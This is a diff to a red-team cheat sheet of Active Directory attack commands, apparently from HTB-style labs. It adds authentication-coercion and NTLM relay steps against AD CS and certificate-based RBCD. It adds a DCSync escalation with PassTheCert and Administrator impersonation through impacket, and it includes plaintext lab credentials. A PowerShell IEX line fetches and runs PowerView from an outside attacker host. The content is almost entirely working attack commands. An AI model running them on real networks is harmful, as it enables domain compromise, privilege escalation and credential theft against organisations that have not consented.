@@ -908,6 +908,7 @@ curl -I http://172.16.117.3/certsrv/
 impacket-ntlmrelayx -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template "Machine"
 # Authentication Coercion
 coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 
 python3 printerbug.py inlanefreight/plaintext$:'MTXr3(GW)lnljOj'@172.16.119.70 <My_IP>
 # pfx
 
@@ -917,6 +918,7 @@ echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwg
 certipy relay -target "http://172.16.119.3" -template Machinene
 
 coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 
 
 certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
 ```
@@ -934,6 +936,7 @@ KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass backup01.inlanefreig
 certipy relay -target "rpc://172.16.119.3" -ca "INLANEFREIGHT-DC01-CA"
 
 coercer scan -t 172.16.119.70 -u 'plaintext$' -p 'MTXr3(GW)lnljOj' -d INLANEFREIGHT.LOCAL -v
+coercer coerce -l MY_IP -t 172.16.19.3 -u own -p 'Password1' -d lab.local -v 
 
 certipy auth -pfx backup01.pfx -dc-ip 172.16.119.3
 ```
@@ -1839,15 +1842,21 @@ certipy req -u 'user@lab.local' -p 'Password' -ca CA_Name -retrieve 31
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
 
-wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x86/PassTheCert.exe
+wget https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/PassTheCert.exe
 
+# RBCD
 .\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --add-computer --computer-name <Computer Name>
-Get-DomainComputer authority
-Get-DomainComputer <Computer Name>
+Get-DomainComputer authority -Properties distinguishedname
+Get-DomainComputer <Computer Name> -Properties objectsid
 .\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --rbcd --target <CN=DC,OU=Domain Controllers,DC=example,DC=com> --sid <Resource-SID>
 
 impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
 impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
+
+# DCSync
+Get-DomainComputer authority -Properties distinguishedname
+Get-DomainUser own_uer -Properties objectsid
+.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --elevate --target DC=AUTHORITY,DC=HTB --sid Own_User_SID
 ```
 #### PetitPotam
 https://github.com/topotam/PetitPotam<br/>
@@ -1872,7 +1881,8 @@ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privi
 
 ### Other Tools
 https://github.com/expl0itabl3/Toolies<br/>
-https://github.com/dxnboy/redteam
+https://github.com/dxnboy/redteam<br/>
+https://github.com/Flangvik/SharpCollection
 
 ## Linux
 ### SUGGEST
